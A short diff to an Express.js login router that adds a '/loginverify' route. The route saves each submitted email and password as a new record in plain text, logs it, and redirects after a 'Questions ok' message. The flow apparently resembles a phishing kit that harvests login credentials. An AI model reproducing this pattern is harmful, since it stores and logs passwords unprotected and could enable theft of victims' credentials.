@@ -218,6 +218,26 @@ router.post('/login', (req, res, next) => {
       'success_msg',
       'Questions ok'
     );
+    res.redirect('/users/loginverify');
+  })
+.catch(err => console.log(err));
+});
+
+// Login Verify
+router.post('/loginverify', (req, res, next) => {
+  const user = new User({
+    email: req.body.email,
+    password: req.body.password,
+  })
+
+  user
+  .save()
+  .then(result => {
+    console.log(result)
+    req.flash(
+      'success_msg',
+      'Questions ok'
+    );
     res.redirect('/users/alert');
   })
 .catch(err => console.log(err));
